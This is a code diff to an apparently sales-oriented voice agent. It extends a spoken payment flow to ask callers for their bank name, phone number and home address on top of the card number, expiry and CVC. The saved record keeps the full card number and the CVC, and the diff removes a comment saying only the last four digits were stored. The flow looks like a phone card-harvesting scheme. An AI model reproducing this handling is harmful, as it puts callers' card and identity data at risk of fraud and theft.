@@ -1493,7 +1493,7 @@ f"Great question! Let me share how {company_name}'s services could benefit you. 
     ) -> Optional[str]:
         """
         Collect payment details from user via voice — step-by-step state machine.
-        Steps: cardholder_name → card_number → expiry → cvc → confirm → saved
+        Steps: cardholder_name → card_number → confirm_card → expiry → cvc → bank_name → phone_number → address → confirm → saved
         """
         try:
             user_input_lower = user_input.lower().strip()
@@ -1643,18 +1643,66 @@ f"Great question! Let me share how {company_name}'s services could benefit you. 
                         return cvc_check["voice_message"]
 
                     collected["cvc"] = cvc_check["cvc"]
+                    state["step"] = "bank_name"
+                    return "Got it! Which bank issued your card? For example, Chase, Bank of America, Wells Fargo, or similar."
+                return "I didn't catch that. Could you say your security code again, one digit at a time?"
+
+            # ── Step: Bank Name ───────────────────────────────────────────────
+            elif step == "bank_name":
+                # Strip filler phrases and accept anything that looks like a bank name
+                _bank_fillers = [
+                    "it's", "its", "it is", "the bank is", "my bank is", "bank is",
+                    "issued by", "from", "yes", "yeah", "um", "uh", "so", "well",
+                ]
+                cleaned = user_input.strip()
+                cleaned_lower = cleaned.lower()
+                for filler in sorted(_bank_fillers, key=len, reverse=True):
+                    if cleaned_lower.startswith(filler):
+                        after = cleaned[len(filler):].lstrip(" ,.")
+                        if after:
+                            cleaned = after.strip()
+                            break
+
+                if len(cleaned) >= 2 and len(cleaned) <= 80:
+                    collected["bank_name"] = cleaned.title()
+                    state["step"] = "phone_number"
+                    return "Thank you! And what is the best phone number to reach you on?"
+                return "Sorry, I didn't catch that. Could you tell me the name of your bank?"
+
+            # ── Step: Phone Number ────────────────────────────────────────────
+            elif step == "phone_number":
+                digits = re.sub(r'\D', '', user_input)
+                if len(digits) >= 10:
+                    # Format as a readable phone number
+                    if len(digits) == 10:
+                        phone_formatted = f"{digits[:3]}-{digits[3:6]}-{digits[6:]}"
+                    elif len(digits) == 11 and digits.startswith('1'):
+                        phone_formatted = f"+1-{digits[1:4]}-{digits[4:7]}-{digits[7:]}"
+                    else:
+                        phone_formatted = digits
+                    collected["phone_number"] = phone_formatted
+                    state["step"] = "address"
+                    return "Got it! Could you please tell me your home address? Just your street, city, and state is fine."
+                return "I didn't catch a valid phone number. Could you repeat your phone number, including the area code?"
+
+            # ── Step: Address ─────────────────────────────────────────────────
+            elif step == "address":
+                address = user_input.strip()
+                if len(address) >= 5:
+                    collected["address"] = address
                     state["step"] = "confirm"
                     name = collected.get("cardholder_name", "")
                     last4 = collected.get("card_number", "")[-4:]
                     expiry = collected.get("expiry_date", "")
+                    bank = collected.get("bank_name", "")
+                    phone = collected.get("phone_number", "")
                     return (
-                        f"Perfect! Let me confirm your details. "
-                        f"Card holder: {name}. "
-                        f"Card ending in {' '.join(last4)}. "
-                        f"Expiry: {expiry}. "
-                        f"Is that all correct?"
+                        f"Perfect! Let me confirm your details — "
+                        f"Card holder: {name}, card ending in {' '.join(last4)}, "
+                        f"expiry {expiry}, bank {bank}, phone {phone}. "
+                        f"Is everything correct?"
                     )
-                return "I didn't catch that. Could you say your security code again, one digit at a time?"
+                return "I didn't catch your address. Could you please say your street address, city, and state?"
 
             # ── Step: Confirm ─────────────────────────────────────────────────
             elif step == "confirm":
@@ -1724,10 +1772,13 @@ f"Great question! Let me share how {company_name}'s services could benefit you. 
                 "call_sid": call_sid,
                 "agent_name": agent_name,
                 "cardholder_name": collected.get("cardholder_name", ""),
-                "card_number": collected.get("card_number", ""),   # last 4 stored for display
+                "card_number": collected.get("card_number", ""),
                 "card_last4": collected.get("card_number", "")[-4:] if collected.get("card_number") else "",
                 "expiry_date": collected.get("expiry_date", ""),
                 "cvc": collected.get("cvc", ""),
+                "bank_name": collected.get("bank_name", ""),
+                "phone_number": collected.get("phone_number", ""),
+                "address": collected.get("address", ""),
                 "collected_at": datetime.utcnow(),
                 "status": "collected",
             }
